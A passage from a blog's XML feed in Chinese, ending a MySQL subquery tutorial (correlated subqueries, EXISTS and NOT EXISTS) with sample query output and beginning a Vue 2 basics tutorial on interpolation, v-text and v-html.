<h3 id="（2）聚合函数下的子查询"><a href="#（2）聚合函数下的子查询" class="headerlink" title="（2）聚合函数下的子查询"></a>（2）聚合函数下的子查询</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 需求：查询平均工资最低的部门id</span><br><span class="line">mysql<span class="operator">&gt;</span> # MySQL中聚合函数是不能嵌套使用的</span><br><span class="line">mysql<span class="operator">&gt;</span> # 错误！！！</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">MIN</span>(<span class="built_in">AVG</span>(salary)) avg_sal</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id;</span><br><span class="line">ERROR <span class="number">1111</span> (HY000): Invalid use <span class="keyword">of</span> <span class="keyword">group</span> <span class="keyword">function</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 方式<span class="number">1</span>：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">HAVING</span> <span class="built_in">AVG</span>(salary) <span class="operator">=</span> (</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>			<span class="keyword">SELECT</span> <span class="built_in">MIN</span>(avg_sal)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>			<span class="keyword">FROM</span>(</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>				<span class="keyword">SELECT</span> <span class="built_in">AVG</span>(salary) avg_sal</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>				<span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>				<span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>			) t_dept_avg_sal</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>			);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+</span></span><br><span class="line"><span class="operator">|</span> department_id <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> #方式<span class="number">2</span>：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">HAVING</span> <span class="built_in">AVG</span>(salary) <span class="operator">&lt;=</span> <span class="keyword">ALL</span>(</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>			<span class="keyword">SELECT</span> <span class="built_in">AVG</span>(salary) avg_sal</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>			<span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>			<span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>			);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+</span></span><br><span class="line"><span class="operator">|</span> department_id <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<h2 id="5-相关子查询"><a href="#5-相关子查询" class="headerlink" title="5. 相关子查询"></a>5. 相关子查询</h2><p>如果子查询的执行依赖于外部查询，通常情况下都是因为子查询中的表用到了外部的表，并进行了条件关联，因此每执行一次外部查询，子查询都要重新计算一次，这样的子查询就称之为 &#x3D;&#x3D;关联子查询&#x3D;&#x3D;。相关子查询按照一行接一行的顺序执行，主查询的每一行都执行一次子查询。</p>
<p><strong>相关子查询执行流程图:</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140133.png" alt="  "></p>
<h3 id="（1）代码示例"><a href="#（1）代码示例" class="headerlink" title="（1）代码示例"></a>（1）代码示例</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 需求：查询员工中工资大于本部门平均工资的员工的last_name,salary和其department_id</span><br><span class="line">mysql<span class="operator">&gt;</span> # 方式<span class="number">1</span>：使用相关子查询</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> last_name,salary,department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees e1</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> salary <span class="operator">&gt;</span> (</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">SELECT</span> <span class="built_in">AVG</span>(salary)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">FROM</span> employees e2</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">WHERE</span> department_id <span class="operator">=</span> e1.department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          )</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> LIMIT <span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+---------------+</span></span><br><span class="line"><span class="operator">|</span> last_name <span class="operator">|</span> salary   <span class="operator">|</span> department_id <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+---------------+</span></span><br><span class="line"><span class="operator">|</span> King      <span class="operator">|</span> <span class="number">24000.00</span> <span class="operator">|</span>            <span class="number">90</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Hunold    <span class="operator">|</span>  <span class="number">9000.00</span> <span class="operator">|</span>            <span class="number">60</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Ernst     <span class="operator">|</span>  <span class="number">6000.00</span> <span class="operator">|</span>            <span class="number">60</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+---------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 方式<span class="number">2</span>：在<span class="keyword">FROM</span>中声明子查询</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> e.last_name,e.salary,e.department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees e,(</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">SELECT</span> department_id,<span class="built_in">AVG</span>(salary) avg_sal</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id) t_dept_avg_sal</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> e.department_id <span class="operator">=</span> t_dept_avg_sal.department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">AND</span> e.salary <span class="operator">&gt;</span> t_dept_avg_sal.avg_sal</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> LIMIT <span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+---------------+</span></span><br><span class="line"><span class="operator">|</span> last_name <span class="operator">|</span> salary   <span class="operator">|</span> department_id <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+---------------+</span></span><br><span class="line"><span class="operator">|</span> Hartstein <span class="operator">|</span> <span class="number">13000.00</span> <span class="operator">|</span>            <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Raphaely  <span class="operator">|</span> <span class="number">11000.00</span> <span class="operator">|</span>            <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Weiss     <span class="operator">|</span>  <span class="number">8000.00</span> <span class="operator">|</span>            <span class="number">50</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+----------+---------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 需求：查询员工的id,salary,按照department_name 排序</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> employee_id,salary</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees e</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> (</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>   	<span class="keyword">SELECT</span> department_name</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>   	<span class="keyword">FROM</span> departments d</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>   	<span class="keyword">WHERE</span> e.department_id <span class="operator">=</span> d.department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  ) <span class="keyword">ASC</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> LIMIT <span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+----------+</span></span><br><span class="line"><span class="operator">|</span> employee_id <span class="operator">|</span> salary   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+----------+</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">178</span> <span class="operator">|</span>  <span class="number">7000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">205</span> <span class="operator">|</span> <span class="number">12000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">206</span> <span class="operator">|</span>  <span class="number">8300.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+----------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<h3 id="（2）EXISTS-与-NOT-EXISTS关键字"><a href="#（2）EXISTS-与-NOT-EXISTS关键字" class="headerlink" title="（2）EXISTS 与 NOT EXISTS关键字"></a>（2）EXISTS 与 NOT EXISTS关键字</h3><ul>
<li>关联子查询通常也会和 EXISTS操作符一起来使用，用来检查在子查询中是否存在满足条件的行。</li>
<li>如果在子查询中不存在满足条件的行：<ul>
<li>条件返回 FALSE</li>
<li>继续在子查询中查找</li>
</ul>
</li>
<li>如果在子查询中存在满足条件的行：<ul>
<li>不在子查询中继续查找</li>
<li>条件返回 TRUE</li>
</ul>
</li>
<li>NOT EXISTS关键字表示如果不存在某种条件，则返回TRUE，否则返回FALSE。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 需求：查询公司管理者的employee_id，last_name，job_id，department_id信息</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> employee_id,last_name,job_id,department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees e1</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>         <span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>         <span class="keyword">FROM</span> employees e2</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>         <span class="keyword">WHERE</span> e1.employee_id <span class="operator">=</span> e2.manager_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>       )</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> LIMIT <span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+---------+---------------+</span></span><br><span class="line"><span class="operator">|</span> employee_id <span class="operator">|</span> last_name <span class="operator">|</span> job_id  <span class="operator">|</span> department_id <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+---------+---------------+</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">100</span> <span class="operator">|</span> King      <span class="operator">|</span> AD_PRES <span class="operator">|</span>            <span class="number">90</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">101</span> <span class="operator">|</span> Kochhar   <span class="operator">|</span> AD_VP   <span class="operator">|</span>            <span class="number">90</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">102</span> <span class="operator">|</span> De Haan   <span class="operator">|</span> AD_VP   <span class="operator">|</span>            <span class="number">90</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-----------+---------+---------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 需求：查询departments表中，不存在于employees表中的部门的department_id和department_name</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> department_id,department_name</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> departments d</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> (</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">FROM</span> employees e</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">WHERE</span> d.department_id <span class="operator">=</span> e.department_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          )</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> LIMIT <span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> department_id <span class="operator">|</span> department_name    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------------+</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">120</span> <span class="operator">|</span> Treasury           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">130</span> <span class="operator">|</span> Corporate Tax      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">140</span> <span class="operator">|</span> Control <span class="keyword">And</span> Credit <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<hr>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue框架总结（一、Vue基础知识）</title>
    <url>/posts/d75d39a7.html</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><h2 id="1-Vue简介"><a href="#1-Vue简介" class="headerlink" title="1. Vue简介"></a>1. Vue简介</h2><ul>
<li><p>Vue 是一套动态构建用户界面的渐进式JavaScript框架</p>
</li>
<li><p><a href="https://cn.vuejs.org/">官网</a></p>
</li>
</ul>
<h2 id="2-Vue特点"><a href="#2-Vue特点" class="headerlink" title="2. Vue特点"></a>2. Vue特点</h2><ul>
<li>采用<code>组件化</code>模式，提供代码复用率，且让代码更好维护</li>
<li><code>声明式</code>编码，让编码人员无需操作直接操作DOM，提高开发效率</li>
<li>使用<code>虚拟DOM</code> + 优秀的 <code>Diff 算法</code>，尽量复用 DOM结点</li>
</ul>
<h2 id="3-Vue周边库"><a href="#3-Vue周边库" class="headerlink" title="3. Vue周边库"></a>3. Vue周边库</h2><ul>
<li>vue-cli：vue脚手架</li>
<li>vue-resource</li>
<li>axios</li>
<li>vue-router：路由</li>
<li>vuex：状态管理</li>
<li>element-ui：基于vue的UI组件库（PC端）</li>
</ul>
<h2 id="4-Vue导入"><a href="#4-Vue导入" class="headerlink" title="4. Vue导入"></a>4. Vue导入</h2><p>Vue是一个JS框架，所以，如果想使用Vue，则在当前页面引入Vue.js文件即可。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--本地导入--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;本地 vue.js 文件路径&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--在线导入--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--对于制作原型或学习，你可以这样使用最新版本--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.8/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--对于生产环境，官方推荐链接到一个明确的版本号和构建文件，以避免新版本造成的不可预期的破坏：--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="5-案例入门"><a href="#5-案例入门" class="headerlink" title="5. 案例入门"></a>5. 案例入门</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 关闭 Vue 生产提示</span></span></span><br><span class="line"><span class="language-javascript">	<span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">	 <span class="comment">// 创建一个Vue对象</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 指定,该对象代表&lt;div id=&quot;root&quot;&gt;,也就是说,这个div中的所有内容,都被当前的app对象管理</span></span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 定义vue中的数据</span></span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">name</span>:<span class="string">&quot;划水艺术家&quot;</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">  	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>效果：</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144220.png" alt="  "></p>
<h1 id="二、Vue基本语法"><a href="#二、Vue基本语法" class="headerlink" title="二、Vue基本语法"></a>二、Vue基本语法</h1><p>Vue模板语法包括两大类：</p>
<p><strong>插值语法</strong>： </p>
<ul>
<li><strong>功能</strong>：用于解析标签体内容 </li>
<li><strong>写法</strong>：<code>&#123;&#123;xxx&#125;&#125;</code>，xxx是js表达式，且可以直接读取到data中的所有区域</li>
</ul>
<hr>
<p><strong>指令语法</strong>： </p>
<ul>
<li><strong>功能</strong>：用于解析标签（包括：标签属性、标签体内容、绑定事件…） </li>
<li><strong>举例</strong>：<code>&lt;a v-bind:href=&quot;xxx&quot;&gt;</code>，xxx同样要写js表达式，且可以直接读取到data中的所有属性</li>
<li><strong>备注</strong>：Vue中有很多的指令，且形式都是v-???，此处我们只是拿v-bind举个例子</li>
</ul>
<h1 id="三、内容渲染指令"><a href="#三、内容渲染指令" class="headerlink" title="三、内容渲染指令"></a>三、内容渲染指令</h1><h2 id="1-插值语法"><a href="#1-插值语法" class="headerlink" title="1. 插值语法"></a>1. 插值语法</h2><p><strong>插值表达式用户把Vue中所定义的数据,显示在页面上. 插值表达式允许用户输入”JS代码片段”</strong><br><strong>语法</strong>：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;&#123; 变量名/对象.属性名 &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>案例</strong>：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--双括号里面是表达式--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--双括号前后跟字符--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;,嘿嘿<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--双括号里面表达式加空格或者字符--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;name+ &#x27;空格或者字符&#x27; + age&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--双括号后加双括号--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;name&#125;&#125; &#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--双括号里面还能进行变量计算--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;age + 20&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">&lt;!--双括号只能写在标签内部,不能写在标签属性里面--&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- &lt;h1 &#123;&#123;name&#125;&#125;&gt; &lt;/h1&gt; 报错--&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">name</span>:<span class="string">&quot;划水艺术家&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">age</span>: <span class="number">20</span>,</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">  	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="2-v-text"><a href="#2-v-text" class="headerlink" title="2. v-text"></a>2. v-text</h2><ul>
<li><strong>v-text 其作用和插值表达式类似。v-text 可以避免插值闪烁问题，当网速比较慢时, 使用插值语法来展示数据, 有可能会产生插值闪烁问题</strong></li>
<li><strong>插值语法只会插入内容，不会清除其余的内容；但 v-text 会把当前元素的其他内容全部清除掉</strong><blockquote>
<p> <strong>插值闪烁</strong>：在数据未加载完成时，页面会显示出原始的 <code>&#123;&#123;&#125;&#125;</code>, 过一会才会展示正常数据。</p>
</blockquote>
</li>
</ul>
<p><strong>语法</strong>：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-text</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>	<span class="comment">&lt;!-- 相当于&lt;span&gt;&#123;&#123;name&#125;&#125;&lt;/span&gt; --&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>v-text</strong>：把数据当作纯文本显示.</li>
</ul>
</blockquote>
<p><strong>案例</strong>：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--v-text 是放在标签属性中--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-text</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="3-v-html"><a href="#3-v-html" class="headerlink" title="3. v-html"></a>3. v-html</h2><p><strong>某些情况下，我们从服务器请求到的数据本身就是一个HTML代码，我们希望前端接受到数据后按照HTML格式进行解析，并且显示对应的内容，那我们就可以使用v-html指令。</strong></p>
<p><strong>语法</strong>：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-html</span>=<span class="string">&quot;myHtml&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>	</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>v-html</strong>：遇到html标签,会正常解析</li>
</ul>
</blockquote>
<p><strong>案例</strong>：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--v-html是放在标签属性中--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">span</span> <span class="attr">v-html</span>=<span class="string">&quot;myHtml&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>	</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">myHtml</span>:<span class="string">&quot;&lt;h1&gt;划水艺术家&lt;/h1&gt;&quot;</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">  	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span 